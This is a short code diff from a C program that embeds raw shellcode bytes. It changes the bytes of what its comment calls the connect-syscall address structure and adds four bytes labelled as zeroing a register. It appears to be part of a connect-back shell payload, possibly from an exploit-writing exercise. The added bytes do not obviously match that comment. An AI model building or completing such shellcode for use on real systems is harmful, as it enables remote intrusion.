@@ -64,9 +64,12 @@ int main(void)
                       ""
                       // "\xaa"
                       // "\x02"
-                      "\x39\x30\x02\xaa"
-                      "\x01\xAA\xAA\x7f"
+                      "\x30\x39\x02\xaa"
+                      "\x7f\xAA\xAA\x01"
                       "\x01\x01\x01\x01\x01\x01\x01\x01" // struct for connect syscall
+                      ""
+                      "\xD4\xBE\xB3\xBB" // 0 out edx
+
                       );
   
   return 0;
